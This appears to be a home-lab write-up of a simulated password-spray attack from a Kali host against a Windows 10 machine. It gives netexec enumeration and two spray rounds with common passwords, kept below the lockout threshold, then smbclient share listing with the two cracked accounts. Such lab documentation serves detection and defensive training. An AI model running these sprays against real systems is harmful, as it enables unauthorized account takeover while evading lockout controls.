# 02 — Attack Simulation (Kali, 192.168.100.106 / hostname BUTCH)

## Step 1 — Target fingerprint (enumeration)

```bash
netexec smb 192.168.100.108 -u '' -p '' --shares
```
Result: `DESKTOP-F0JVTQT`, Windows 10 Build 19041 x64, `signing:False`, `SMBv1:None`. (Null session denied, as expected.)

## Step 2 — Spray Round 1: password `Winter2024!` across all users

```bash
netexec smb 192.168.100.108 -u users.txt -p 'Winter2024!'
```
Result: all users `STATUS_LOGON_FAILURE` except **`[+] DESKTOP-F0JVTQT\dwilliams:Winter2024!`** — first compromise.
📸 `evidence/01-kali-spray-round1.png`

## Step 3 — Spray Round 2: password `Password1` (low-and-slow, after delay)

```bash
netexec smb 192.168.100.108 -u users.txt -p 'Password1'
```
Result: `dwilliams`, `asmth`, `lgarcia`, `rtan`, `okim`, `mflores` all `STATUS_LOGON_FAILURE`; **`[+] DESKTOP-F0JVTQT\jdoe:Password1`** — second compromise (jdoe reused the weak password from Case 1).
📸 `evidence/02-kali-spray-round2.png`

**No `ACCOUNT_LOCKED_OUT` anywhere** — every account stayed at ≤2 failures, below the lockout threshold of 5.

## Step 4 — Verify compromised access

```bash
smbclient -L //192.168.100.108 -U dwilliams%Winter2024!
```
Result: shares enumerated (`ADMIN$`, `C$`, `IPC$` listed). (Trailing SMB1 reconnect error is harmless — SMBv1 disabled.)
📸 `evidence/03-kali-successful-access.png`

## Attack window

2026-10-27 ~23:30 → 23:32 UTC+8 (Wazuh timestamps). Two rounds, two compromised accounts, zero lockouts.
